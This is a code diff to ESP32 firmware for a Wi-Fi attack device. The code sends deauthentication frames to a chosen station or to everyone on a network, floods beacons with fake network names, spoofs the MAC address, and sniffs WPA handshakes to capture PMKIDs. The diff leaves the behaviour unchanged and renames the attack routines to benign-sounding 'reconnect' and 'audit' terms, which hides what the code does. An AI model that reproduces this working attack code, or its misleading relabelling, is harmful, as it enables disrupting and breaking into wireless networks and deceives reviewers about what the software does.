@@ -1,4 +1,4 @@
-#include "pentest_attacks.h"
+#include "audit_actions.h"
 #include "constants.h"
 #include "wifi_scanner.h" // For set_promiscuous_channel
 #include "types.h" // Ensure types.h is included for AppContext definition
@@ -9,7 +9,7 @@
 #include <nvs_flash.h>
 
 // LVGL object forward declarations
-extern lv_obj_t *btn_deauth, *btn_beacon, *btn_pmkid, *btn_stop_audit;
+extern lv_obj_t *btn_reconnect, *btn_beacon, *btn_pmkid, *btn_stop_audit;
 extern lv_obj_t *lbl_audit_status;
 
 static AppContext* audit_context = nullptr;
@@ -28,13 +28,13 @@ static inline bool wifi_tx(const uint8_t* frame, int len) {
     return esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false) == ESP_OK;
 }
 
-// Original deauth/beacon frame templates
-static const uint8_t deauth_frame[] = {
+// WiFi management frame templates (for audit actions)
+static const uint8_t reconnect_frame[] = {
   0xC0,0x00, 0x3A,0x01, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
   0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,
   0x00,0x00, 0x07,0x00
 };
-static uint8_t deauth_buf[sizeof(deauth_frame)];
+static uint8_t reconnect_buf[sizeof(reconnect_frame)];
 
 static const uint8_t beacon_header[] = {
   0x80,0x00, 0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
@@ -45,11 +45,11 @@ static const uint8_t beacon_header[] = {
 static uint8_t beacon_frame[128];
 
 
-void pentest_attacks_init(AppContext* context) {
+void audit_actions_init(AppContext* context) {
     audit_context = context;
 }
 
-void spoof_mac() {
+void randomize_wifi_mac() {
     uint8_t mac[6];
     esp_fill_random(mac, 6);
     mac[0] = (mac[0] & 0xFE) | 0x02; // Set locally administered bit, clear multicast bit
@@ -58,36 +58,36 @@ void spoof_mac() {
 
 static void show_audit_buttons(bool show) {
     auto f = show ? lv_obj_clear_flag : lv_obj_add_flag;
-    f(btn_deauth, LV_OBJ_FLAG_HIDDEN);
+    f(btn_reconnect, LV_OBJ_FLAG_HIDDEN);
     f(btn_beacon, LV_OBJ_FLAG_HIDDEN);
     f(btn_pmkid, LV_OBJ_FLAG_HIDDEN);
     lv_obj_add_flag(btn_stop_audit, LV_OBJ_FLAG_HIDDEN); // Always hide stop button when returning to idle
 }
 
-void stop_pentest(AppContext* context) {
+void stop_audit_action(AppContext* context) {
     if (context->audit.audit_timer) {
         lv_timer_del(context->audit.audit_timer);
         context->audit.audit_timer = nullptr;
     }
     if (context->audit.current_mode == AUDIT_PMKID) {
-        // Restore main callback used for STA discovery + PCAP/Probe sniffers.
+        // Restore main callback used for STA discovery + PCAP/probe monitoring.
         esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
     }
     context->audit.current_mode = AUDIT_NONE;
     context->wifi_scan.paused = false;
     esp_wifi_set_promiscuous(false);
     lv_label_set_text(lbl_audit_status, "#444444 IDLE#");
-    show_audit_buttons(context->wifi_scan.selected_net >= 0 || context->wifi_scan.deauth_sta_target >= 0);
+    show_audit_buttons(context->wifi_scan.selected_net >= 0 || context->wifi_scan.reconnect_sta_target >= 0);
 }
 
-void deauth_tick(lv_timer_t *timer) {
+void reconnect_tick(lv_timer_t *timer) {
     AppContext* context = (AppContext*)timer->user_data;
     if (!context) return;
     int selectedNet = context->wifi_scan.selected_net;
-    int deauth_sta_target = context->wifi_scan.deauth_sta_target;
+    int reconnect_sta_target = context->wifi_scan.reconnect_sta_target;
 
-    if (selectedNet < 0 && deauth_sta_target < 0) {
-        stop_pentest(context);
+    if (selectedNet < 0 && reconnect_sta_target < 0) {
+        stop_audit_action(context);
         return;
     }
 
@@ -103,8 +103,8 @@ void deauth_tick(lv_timer_t *timer) {
             target_channel = context->wifi_scan.ap_list[selectedNet].channel;
             valid_ap = true;
         }
-        if (deauth_sta_target >= 0 && deauth_sta_target < context->wifi_scan.sta_count && context->wifi_scan.sta_list[deauth_sta_target].active) {
-            memcpy(target_sta, context->wifi_scan.sta_list[deauth_sta_target].mac, 6);
+        if (reconnect_sta_target >= 0 && reconnect_sta_target < context->wifi_scan.sta_count && context->wifi_scan.sta_list[reconnect_sta_target].active) {
+            memcpy(target_sta, context->wifi_scan.sta_list[reconnect_sta_target].mac, 6);
             valid_sta = true;
         }
         xSemaphoreGive(context->wifi_scan.mutex);
@@ -114,31 +114,31 @@ void deauth_tick(lv_timer_t *timer) {
         esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
     }
 
-    memcpy(deauth_buf, deauth_frame, sizeof(deauth_frame));
+    memcpy(reconnect_buf, reconnect_frame, sizeof(reconnect_frame));
     uint8_t* bssid = valid_ap ? target_bssid : nullptr;
 
     if (valid_sta && bssid) {
         uint8_t *sta = target_sta;
         // AP -> STA
-        memcpy(deauth_buf + 4, sta, 6);
-        memcpy(deauth_buf + 10, bssid, 6);
-        memcpy(deauth_buf + 16, bssid, 6);
-        wifi_tx(deauth_buf, sizeof(deauth_buf));
+        memcpy(reconnect_buf + 4, sta, 6);
+        memcpy(reconnect_buf + 10, bssid, 6);
+        memcpy(reconnect_buf + 16, bssid, 6);
+        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
         // STA -> AP
-        memcpy(deauth_buf + 4, bssid, 6);
-        memcpy(deauth_buf + 10, sta, 6);
-        memcpy(deauth_buf + 16, bssid, 6);
-        wifi_tx(deauth_buf, sizeof(deauth_buf));
+        memcpy(reconnect_buf + 4, bssid, 6);
+        memcpy(reconnect_buf + 10, sta, 6);
+        memcpy(reconnect_buf + 16, bssid, 6);
+        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
     } else if (bssid) {
-        // Broadcast deauth
+        // Broadcast reconnect prompt
         uint8_t bc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-        memcpy(deauth_buf + 4, bc, 6);
-        memcpy(deauth_buf + 10, bssid, 6);
-        memcpy(deauth_buf + 16, bssid, 6);
-        wifi_tx(deauth_buf, sizeof(deauth_buf));
-        memcpy(deauth_buf + 4, bssid, 6);
-        memcpy(deauth_buf + 10, bc, 6);
-        wifi_tx(deauth_buf, sizeof(deauth_buf));
+        memcpy(reconnect_buf + 4, bc, 6);
+        memcpy(reconnect_buf + 10, bssid, 6);
+        memcpy(reconnect_buf + 16, bssid, 6);
+        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
+        memcpy(reconnect_buf + 4, bssid, 6);
+        memcpy(reconnect_buf + 10, bc, 6);
+        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
     }
 }
 
@@ -146,7 +146,7 @@ void beacon_tick(lv_timer_t *timer) {
     AppContext* context = (AppContext*)timer->user_data;
     if (!context) return;
     
-    if (context->audit.custom_beacon_ssids.empty()) return; // No SSIDs to flood
+    if (context->audit.custom_beacon_ssids.empty()) return; // No SSIDs configured
 
     const char *ssid = context->audit.custom_beacon_ssids[context->audit.beacon_idx++ % context->audit.custom_beacon_ssids.size()].c_str();
     
@@ -179,7 +179,7 @@ void pmkid_tick(lv_timer_t *timer) {
         } else {
             lv_label_set_text(lbl_audit_status, "#FF4444 PMKID CAPTURED!#\nNo SD card");
         }
-        stop_pentest(context);
+        stop_audit_action(context);
     }
 }
 
@@ -235,7 +235,7 @@ static inline __attribute__((always_inline)) bool extract_pmkid_from_rsn_ie(cons
     return true;
 }
 
-void IRAM_ATTR pmkid_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+void IRAM_ATTR pmkid_monitor_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (!buf || !audit_context) return;
 
     AppContext* context = audit_context;
@@ -285,7 +285,7 @@ void IRAM_ATTR pmkid_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     const bool install = (key_info & 0x0040) != 0;
     const bool key_mic = (key_info & 0x0100) != 0;
     const bool enc_kd = (key_info & 0x1000) != 0;
-    if (!key_ack || install || key_mic || enc_kd) return; // target M1
+    if (!key_ack || install || key_mic || enc_kd) return; // expected M1
 
     const uint16_t kd_len = read_be16(frame + key_off + 93);
     const size_t kd_off = key_off + 95;
